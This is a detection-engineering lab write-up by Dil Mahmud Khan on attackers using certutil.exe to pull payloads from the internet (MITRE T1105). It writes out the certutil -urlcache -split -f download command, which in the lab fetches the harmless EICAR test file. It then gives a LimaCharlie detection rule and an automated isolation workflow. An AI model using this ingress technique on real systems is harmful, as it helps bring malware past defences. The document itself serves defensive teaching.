# Scenario 1: LOLBAS Tool Ingress via Certutil.exe

* **Technique:** Ingress Tool Transfer
* **MITRE ATT&CK ID:** [T1105](https://attack.mitre.org/techniques/T1105/)
* **Platform:** Windows 10/11
* **Severity:** High (P2)
* **Author:** Dil Mahmud Khan

---

## 1. Overview & Adversary Objective

Attackers frequently leverage built-in Windows signed binaries (known as **LOLBAS** — Living Off The Land Binaries and Scripts) to download external malware, tools, or scripts. Because `certutil.exe` is a trusted Microsoft certificate management utility located in `System32`, basic antivirus solutions and egress filters often allow it to connect to the internet without generating an alert.

In this scenario:
* An attacker with command execution on a Windows machine uses `certutil.exe` to pull a second-stage payload from an external web server into the local temporary directory.

---

## 2. Attack Execution

Execute the standalone script in this directory:
```powershell
# Open PowerShell as Administrator
cd C:\LabAttacks
.\attack.ps1
```

Or run the direct command:
```cmd
certutil.exe -urlcache -split -f https://secure.eicar.org/eicar.com C:\LabAttacks\payload_certutil.tmp
```

*Command breakdown:*
* `-urlcache`: Instructs certutil to display URL cache entries or fetch files.
* `-split`: Splits and downloads the target file.
* `-f`: Forces overwrite of existing files.

---

## 3. Detection Engineering (LimaCharlie EDR)

### Detection Logic:
Normal administrative use of `certutil.exe` involves installing certificates or viewing certificate authorities. Administrators almost never invoke `-urlcache` together with `-split` in routine administration.

Rule file: `detection_rule.yaml`
```yaml
detect:
  event: NEW_PROCESS
  op: and
  rules:
    - op: ends with
      path: event/FILE_PATH
      value: certutil.exe
    - op: contains
      path: event/COMMAND_LINE
      value: -urlcache
    - op: contains
      path: event/COMMAND_LINE
      value: -split

respond:
  - action: report
    name: "T1105 - Ingress Tool Transfer via Certutil.exe"
    publish: true
```

---

## 4. Automated SOAR & Response Workflow

1. LimaCharlie matches the rule and sends a webhook to Tines.
2. Tines extracts `payload_certutil.tmp` SHA-256 hash.
3. Tines queries the VirusTotal API -> 58/72 engines confirm malicious score.
4. Tines alerts the SOC Slack channel.
5. Analyst clicks **[ Isolate Machine ]** -> LimaCharlie isolates the Windows host within seconds.
